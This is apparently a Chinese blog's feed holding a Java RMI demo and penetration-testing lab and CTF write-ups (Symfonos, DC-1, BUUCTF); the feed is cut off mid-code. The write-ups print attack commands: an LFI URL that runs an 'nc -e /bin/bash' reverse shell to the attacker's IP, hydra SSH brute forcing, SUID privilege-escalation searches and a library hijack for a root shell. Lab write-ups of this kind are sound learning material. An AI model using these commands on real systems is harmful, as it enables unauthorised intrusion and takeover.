class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHelloToSomeBody</span><span class="params">(String someBodyName)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HelloImpl-java"><a href="#HelloImpl-java" class="headerlink" title="HelloImpl.java"></a>HelloImpl.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHelloToSomeBody</span><span class="params">(String someBodyName)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Connected sucessfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你好，&quot;</span> + someBodyName + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HelloServer-java"><a href="#HelloServer-java" class="headerlink" title="HelloServer.java"></a>HelloServer.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IHello rhello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">            <span class="comment">// 如果配置在远程服务器，把地址换成你的ip</span></span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://localhost:8888/RHello&quot;</span>, rhello);</span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;INFO:远程IHello对象绑定成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;创建远程对象发生异常！&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生重复绑定对象异常！&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生URL畸形异常！&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMIClient-java"><a href="#RMIClient-java" class="headerlink" title="RMIClient.java"></a>RMIClient.java</h3><p>客户端直接调用服务端在远程开放的接口就可以实现远程调用的功能，这里使用Naming.lookup的方法来获取到实现类，在实现类的传输过程中，类对象以序列化的形式传输。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Server.IHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IHello rhello = (IHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:8888/RHello&quot;</span>);</span><br><span class="line">            System.out.println(rhello.sayHelloToSomeBody(<span class="string">&quot;XZLang&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动服务端：</p><p><img src= "/img/loading.gif" data-lazy-src="/3.png"></p><p>执行客户端代码：</p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;​      **RMI: 远程方法调用(Remote Method Invocation)**，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。&lt;/p&gt;</summary>
    
    
    
    <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="RMI" scheme="http://yoursite.com/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Java安全初步</title>
    <link href="http://yoursite.com/2020/08/11/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5/"/>
    <id>http://yoursite.com/2020/08/11/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5/</id>
    <published>2020-08-11T05:59:42.000Z</published>
    <updated>2020-09-15T07:42:14.116Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直没有系统的对Javaweb的安全做一个系统的学习和总结，主要原因也是没有怎么熟悉Javaweb的开发细节，在学习了一段时间的Javaweb之后，决定开始就Javaweb代码层面的安全做以学习和总结。</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前一直没有系统的对Javaweb的安全做一个系统的学习和总结，主要原因也是没有怎么熟悉Javaweb的开发细节，在学习了一段时间的Javaweb之后，决定开始就Javaweb代码层面的安全做以学习和总结。&lt;/p&gt;</summary>
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透系列</title>
    <link href="http://yoursite.com/2020/08/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97/"/>
    <id>http://yoursite.com/2020/08/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97/</id>
    <published>2020-08-11T02:16:52.000Z</published>
    <updated>2021-01-29T09:36:34.558Z</updated>
    
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Symfonos3-shellshock</title>
    <link href="http://yoursite.com/2020/08/03/Symfonos3-%E5%97%AF%E5%91%90%E5%97%AF%E5%91%90/"/>
    <id>http://yoursite.com/2020/08/03/Symfonos3-%E5%97%AF%E5%91%90%E5%97%AF%E5%91%90/</id>
    <published>2020-08-03T05:03:45.000Z</published>
    <updated>2020-08-03T14:35:09.981Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>主机开了21，22，80端口，然后用dirb扫一下目录看看</p><p><img src= "/img/loading.gif" data-lazy-src="/3.png"></p><p>扫出了<code>cgi-bin</code>，接着扫，在<code>cgi-bin</code>目录下扫到了一个<code>underworld</code>目录</p><p>访问</p><p><img src= "/img/loading.gif" data-lazy-src="/4.png"></p><p>显然这个页面的显示是uptime命令的回显结果</p><p>这里是一个<code>shellshock</code>的漏洞，直接用MSF的EXP一把梭</p><p><img src= "/img/loading.gif" data-lazy-src="/5.png"></p><p>拿到shell之后，考虑提权</p><p>先用<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linPEAS</a>脚本跑一下</p><p>然后可以找到<code>tcpdump</code>的<code>cap</code></p><p><img src= "/img/loading.gif" data-lazy-src="/.png"></p><p>下载工具pyps</p><blockquote><p>wget <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64/">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\</a></p><p>pspy是一种命令行工具，旨在无需root权限即可监听进程。它使您可以查看其他用户执行的命令，cron作业等。非常适合枚举CTF中的Linux系统。很好地向您的同事展示为什么在命令行中将秘密作为参数传递是一个坏主意。<br> 该工具从procfs扫描中收集信息。放置在文件系统选定部分上的Inotify观察程序将触发这些扫描，以捕获短暂的进程。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/7.png"></p><p><strong>ftp协议是明文传输的</strong>，如果能抓到ftp的包，那就可以得到账号密码了。那么使用什么工具抓包呢？比较常用的是<strong>tcpdump</strong>，查看靶机上是否安装了tcpdump，命令：<code>tcpdump --version</code></p><blockquote><p>tcpdump -i lo -w ftp.pcap</p><p>开启临时的HTTP服务</p><p>python -m SimpleHTTPServer 9999</p><p>在Kali上下载</p><p>wget <a href="http://192.168.40.160:9999/ftp.pcap">http://192.168.40.160:9999/ftp.pcap</a></p></blockquote><p>然后wireshark分析一下就有用户名密码了</p><p><img src= "/img/loading.gif" data-lazy-src="/8.png"></p><p>然后直接ssh登录</p><p><img src= "/img/loading.gif" data-lazy-src="/9.png"></p><p>刚才使用pspy工具的时候发现，ftpclient.py是以root身份运行的，如果hades用户具有对ftpclient.py脚本的写入权限，那么就可以提权。但是这里没有权限，那么我们考虑来看看hades对那些文件有可写权限</p><blockquote><p>find / -writable -type d 2&gt;/dev/null</p></blockquote><p>发现好东西了</p><p><img src= "/img/loading.gif" data-lazy-src="/10.png"></p><p>然后考虑对ftpclient.py文件中导入的ftplib模块的源码进行修改</p><p><img src= "/img/loading.gif" data-lazy-src="/11.png"></p><p>如图，现在监听端口，就可以接到root的反弹shell</p><p><img src= "/img/loading.gif" data-lazy-src="/12.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Symfnons" scheme="http://yoursite.com/tags/Symfnons/"/>
    
  </entry>
  
  <entry>
    <title>Symfonos2:啊这啊这</title>
    <link href="http://yoursite.com/2020/07/22/Symfonos2-%E5%95%8A%E8%BF%99%E5%95%8A%E8%BF%99/"/>
    <id>http://yoursite.com/2020/07/22/Symfonos2-%E5%95%8A%E8%BF%99%E5%95%8A%E8%BF%99/</id>
    <published>2020-07-22T09:11:08.000Z</published>
    <updated>2020-07-22T13:10:07.860Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p>照常扫扫</p><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p>139端口和445端口开着，先连上共享文件</p><p>整出来一个<code>log.txt</code>文件</p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>审计这个日志，发现用户名是<code>aeolus</code></p><p><img src= "/img/loading.gif" data-lazy-src="/3.png"></p><p>然后没有其他信息的情况下，试试爆破ssh</p><blockquote><p>hydra -l aeolus -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.40.156</p></blockquote><p>爆出来密码<code>sergioteamo</code></p><p>然后连上</p><p>上去用nmap扫自己，扫出了好东西</p><p><img src= "/img/loading.gif" data-lazy-src="/6.png"></p><p>看看这个8080端口，只允许本地访问，这个好办，直接端口转发</p><blockquote><p>ssh  -L 8080:127.0.0.1:8080 <a href="mailto:&#x61;&#x65;&#x6f;&#x6c;&#117;&#x73;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#49;&#46;&#49;&#50;&#x39;">&#x61;&#x65;&#x6f;&#x6c;&#117;&#x73;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#49;&#46;&#49;&#50;&#x39;</a></p></blockquote><p>然后访问一下</p><p><img src= "/img/loading.gif" data-lazy-src="/7.png"></p><p>是个叫做librenms的站，MSF搜到exp，直接一把梭拿到shell</p><p>然后MySQL提权成root</p><p><img src= "/img/loading.gif" data-lazy-src="/8.png"></p><p>拿到final flag</p><p><img src= "/img/loading.gif" data-lazy-src="/9.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
    <category term="Symfonos" scheme="http://yoursite.com/tags/Symfonos/"/>
    
    <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Symfonos:SMTP与LFI</title>
    <link href="http://yoursite.com/2020/07/20/Symfonos-SMTP%E4%B8%8ELFI/"/>
    <id>http://yoursite.com/2020/07/20/Symfonos-SMTP%E4%B8%8ELFI/</id>
    <published>2020-07-20T06:35:22.000Z</published>
    <updated>2020-07-20T09:11:47.602Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p>扫出靶机IP</p><p>然后用nmap来获取主机信息</p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>可以看到，主机开启了25端口的SMTP服务</p><p>于是直接连接上共享</p><blockquote><p>smb://192.168.40.155</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/3.png"></p><p>然后打开不需要密码的目录</p><p><img src= "/img/loading.gif" data-lazy-src="/4.png"></p><p>这里基本上给了信息，用这几个密码尝试连接helios目录，发现qwerty可以</p><p><img src= "/img/loading.gif" data-lazy-src="/5.png"></p><p>访问<code>h3l105</code>，发现了一个<code>wordpress</code>搭建的站点</p><p><img src= "/img/loading.gif" data-lazy-src="/6.png"></p><p><img src= "/img/loading.gif" data-lazy-src="/7.png"></p><p>点击链接会跳转到<code>http://symfonos.local</code>，所以在本机的hosts里面加上这个IP和域名的映射</p><p>因为是WP搭的站，直接用wpscan扫一下</p><blockquote><p>wpscan –url <a href="http://symfonos.local/h3l105">http://symfonos.local/h3l105</a></p></blockquote><p>扫到了两个插件</p><p><img src= "/img/loading.gif" data-lazy-src="/8.png"></p><p>然后去<code>searchsploit</code>试试，扫出来两个洞，其中有个本地文件包含</p><p><img src= "/img/loading.gif" data-lazy-src="/9.png"></p><p>然后根据给定的poc去尝试漏洞</p><p><img src= "/img/loading.gif" data-lazy-src="/10.png"></p><p>那么联系到之前扫到的25端口的smtp服务，可以试图通过邮件污染的方法进行RCE</p><p><img src= "/img/loading.gif" data-lazy-src="/11.png"></p><p>发送一个有问题的邮件，然后弹一个shell过来</p><blockquote><p>[<a href="http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc%20-e%20/bin/bash%20192.168.40.150%201551%5D">http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc%20-e%20/bin/bash%20192.168.40.150%201551]</a>(<a href="http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc">http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc</a> -e /bin/bash 192.168.40.150 1551)</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/12.png"></p><p>接下来是提权，先考虑suid的方法</p><p><img src= "/img/loading.gif" data-lazy-src="/13.png"></p><p>发现了一个可疑的文件</p><p>strings一下这个文件，发现了一个更加可疑的curl命令</p><p><img src= "/img/loading.gif" data-lazy-src="/14.png"></p><p>此时的思路是，statuscheck文件执行的时候，会从环境变量里面获得curl的目录，然后执行curl命令，那么我们如果伪造curl文件，并写入环境变量中，就可以提权</p><p><img src= "/img/loading.gif" data-lazy-src="/15.png"></p><p>通过这个思路，我们成功提权</p><p>并且拿到flag</p><p><img src= "/img/loading.gif" data-lazy-src="/16.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Symfonos" scheme="http://yoursite.com/tags/Symfonos/"/>
    
    <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
    <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>DC-1:SUID提权初体验</title>
    <link href="http://yoursite.com/2020/07/18/DC-1-find%E6%8F%90%E6%9D%83%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2020/07/18/DC-1-find%E6%8F%90%E6%9D%83%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2020-07-17T16:31:00.000Z</published>
    <updated>2020-07-18T06:55:04.046Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p> 靶机开启，直接<code>arp-san -l</code></p><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p>扫到IP之后nmap扫着看看</p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>可以看到开启了22,80端口，用工具可以看到CMS为<code>drupal</code></p><p><img src= "/img/loading.gif" data-lazy-src="/3.png"></p><p>直接启动MSF</p><blockquote><p>service postgressql start</p><p>msfdb init</p><p>msfconsole</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/4.png"></p><p>打进去了，然后通过python拿到shell</p><p><img src= "/img/loading.gif" data-lazy-src="/5.png"></p><p>翻翻找找，在home目录里面拿到了一个hint</p><p><img src= "/img/loading.gif" data-lazy-src="/6.png"></p><h2 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h2><p>根据这句提示，我们可以想到通过SUID的可执行文件来提权</p><p>以下几个命令可以用来找到系统中运行的SUID文件</p><blockquote><p>find / -user root -perm -4000 -print 2&gt;/dev/null </p><p>find / -perm -u=s -type f 2&gt;/dev/null </p><p>find / -perm -4000 2&gt; /dev/null</p><p>find / -user root -perm -4000 -exec ls -ldb {} ;</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/7.png"></p><p>有find，好办了，直接利用find执行命令</p><p><img src= "/img/loading.gif" data-lazy-src="/8.png"></p><p>提权成功，可以在root目录里面拿flag了</p><p>当然，这种玩法没有拿到所有flag，我们继续</p><h2 id="打数据库admin"><a href="#打数据库admin" class="headerlink" title="打数据库admin"></a>打数据库admin</h2><p>在网站目录下的setting.php文件下我们找到了flag2以及数据库的用户名密码</p><p><img src= "/img/loading.gif" data-lazy-src="/9.png"></p><p>登上数据库后发现有一个<code>users</code>的表</p><p><img src= "/img/loading.gif" data-lazy-src="/10.png"></p><p>打开看看</p><p><img src= "/img/loading.gif" data-lazy-src="/11.png"></p><p>这里想要搞到admin的密码，可以先搜一下有无可用的EXP</p><p><img src= "/img/loading.gif" data-lazy-src="/12.png"></p><p>直接就有一个可以添加管理员账号的EXP，直接打</p><p><img src= "/img/loading.gif" data-lazy-src="/13.png"></p><p>然后再看看数据库</p><p><img src= "/img/loading.gif" data-lazy-src="/14.png"></p><p>妥了，直接登录，得到flag3</p><p><img src= "/img/loading.gif" data-lazy-src="/15.png"></p><p>这里提示我们去看shadow文件，我们利用上面的方式提权至root，去看看</p><p><img src= "/img/loading.gif" data-lazy-src="/16.png"></p><h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>可以知道有个flag4的用户，可以用ssh登录来爆破这个用户的密码</p><p>用hydra爆破一下，密码是orange，直接登录</p><blockquote><p>hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt  ssh://192.168.40.154</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/17.png"></p><p>登录然后拿到flag4</p><p><img src= "/img/loading.gif" data-lazy-src="/18.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="DC-1" scheme="http://yoursite.com/tags/DC-1/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-WriteUp合集(3)</title>
    <link href="http://yoursite.com/2020/05/20/BUUCTF-WriteUp%E5%90%88%E9%9B%86-3/"/>
    <id>http://yoursite.com/2020/05/20/BUUCTF-WriteUp%E5%90%88%E9%9B%86-3/</id>
    <published>2020-05-20T15:25:55.000Z</published>
    <updated>2020-05-20T15:27:06.296Z</updated>
    
    <content type="html"><![CDATA[<p>刷题记录：</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷题记录：&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-WriteUp合集(2)</title>
    <link href="http://yoursite.com/2020/05/19/BUUCTF-WriteUp%E5%90%88%E9%9B%86-2/"/>
    <id>http://yoursite.com/2020/05/19/BUUCTF-WriteUp%E5%90%88%E9%9B%86-2/</id>
    <published>2020-05-19T10:37:38.000Z</published>
    <updated>2020-05-20T15:17:53.774Z</updated>
    
    <content type="html"><![CDATA[<p>刷题记录</p><a id="more"></a><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>知识点：</p><ul><li><p>Smarty SSTI</p></li><li><p>XFF</p><p>题目打开后，提示了<code>Build With Smarty !</code>，于是猜测存在<code>Smarty SSTI</code>，右上角有回显的IP。然后题目提示有XXF，抓个包直接改XFF为<code>Smarty SSTI</code>的payload，没想到直接打通了。</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><p>关于Smarty SSTI可以看这篇文章</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/91595921">https://zhuanlan.zhihu.com/p/91595921</a></p></blockquote><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>看前端源码的注释</p><p><img src= "/img/loading.gif" data-lazy-src="/2.png"></p><p>怀疑有文件包含，伪协议直接读文件内容，成功</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>change.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span 